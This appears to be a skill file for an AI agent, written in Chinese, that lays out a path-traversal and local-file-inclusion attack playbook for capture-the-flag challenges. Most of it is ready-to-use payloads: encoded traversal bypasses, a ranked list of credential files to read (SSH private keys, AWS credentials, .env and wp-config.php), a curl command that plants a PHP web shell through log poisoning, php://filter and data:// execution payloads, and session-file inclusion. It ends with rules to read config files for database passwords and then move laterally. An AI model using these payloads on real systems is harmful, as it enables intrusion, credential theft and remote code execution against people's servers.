---
name: path-traversal-lfi
description: 路径穿越/文件包含(LFI)完整攻击通法。Use when the challenge has file read/download/include functionality, or any parameter that takes a filename/path. Covers encoding bypass, target files, and LFI-to-RCE escalation.
---

# 路径穿越 / LFI 通法

## 检测点

任何接受文件名/路径的参数: `?file=`, `?page=`, `?path=`, `?template=`, `?include=`, `?doc=`, `?download=`

## 绕过过滤(逐一试)

```bash
# 基础
../../../etc/passwd

# URL 编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重 URL 编码(服务器解码一次后过滤,再解码一次)
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode / Overlong UTF-8
..%c0%af..%c0%afetc%c0%afpasswd

# 过滤器删 ../ 后残留
....//....//etc/passwd
..././..././etc/passwd

# Null byte (老版 PHP)
../../../../etc/passwd%00.jpg

# 路径截断(Windows/Tomcat)
..\..\..\..\windows\win.ini
..;/..;/..;/etc/passwd
```

## 高价值目标文件

### Linux (按优先级)
```
/etc/passwd                    # 用户列表
/proc/self/environ             # 环境变量(DB密码/API KEY!)
/proc/self/cmdline             # 进程命令行
/var/www/html/.env             # Laravel/Node env vars
/var/www/html/config.php       # PHP 配置(DB密码)
/var/www/html/wp-config.php    # WordPress DB
/home/*/.ssh/id_rsa            # SSH 私钥
/home/*/.bash_history          # 命令历史(含密码)
/home/*/.aws/credentials       # AWS AK/SK
/flag                          # CTF flag 直接文件
/flag.txt
/app/flag
/root/flag
```

### Web 配置(凭据)
```
/etc/nginx/sites-enabled/default
/etc/apache2/sites-enabled/000-default.conf
/app/.env
/app/config/database.yml
/app/application.properties    # Spring Boot
```

## LFI → RCE 升级

### 方法 1: /proc/self/environ 注入
```
User-Agent 里写 PHP 代码 → 读 /proc/self/environ 触发执行
```

### 方法 2: Log Poisoning
```bash
# 步骤 1: 把 PHP 代码写入 access log
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target/
# 步骤 2: 通过 LFI 包含 log 文件
?file=../../../../var/log/apache2/access.log&c=cat /flag
?file=../../../../var/log/nginx/access.log&c=id
```

### 方法 3: PHP filter 链(无需写文件)
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php  # 读源码
php://input  # POST body 作为 PHP 执行(allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### 方法 4: Session 文件包含
```
# PHP session 存在 /tmp/sess_PHPSESSID
# 控制 session 里的值(如用户名) → 包含 session 文件 → RCE
?file=/tmp/sess_abc123
```

## 铁律

- **先试直接读 /flag** — 很多 CTF flag 就在根目录
- 试完 /flag 再试 /proc/self/environ(环境变量里可能有)
- 编码绕过至少试 3 种(基础/URL编码/双重编码)
- LFI 能读文件后,**先读源码**(config.php/.env)找数据库密码,再横向
